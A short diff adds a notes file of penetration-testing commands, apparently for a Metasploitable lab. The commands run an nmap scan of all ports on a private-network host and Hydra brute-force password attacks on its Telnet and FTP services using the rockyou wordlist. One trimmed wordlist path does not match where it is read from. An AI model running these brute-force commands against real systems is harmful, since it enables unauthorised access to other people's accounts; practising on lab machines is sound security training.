@@ -1,0 +1,11 @@
+#Finding Open Ports with Nmap
+nmap -sV -p- 192.168.0.110
+
+#Brute-Force Attack Using Hydra (Telnet)
+hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt telnet://192.168.0.110
+
+#Hydra with the Small Wordlist:
+sudo head -n 1000 /usr/share/wordlists/rockyou.txt | sudo tee /home/kali/small_wordlist.txt > /dev/null
+
+#Run Hydra with the Small Wordlist using FTP:
+hydra -l msfadmin -P /home/small_wordlist.txt ftp://192.168.0.110
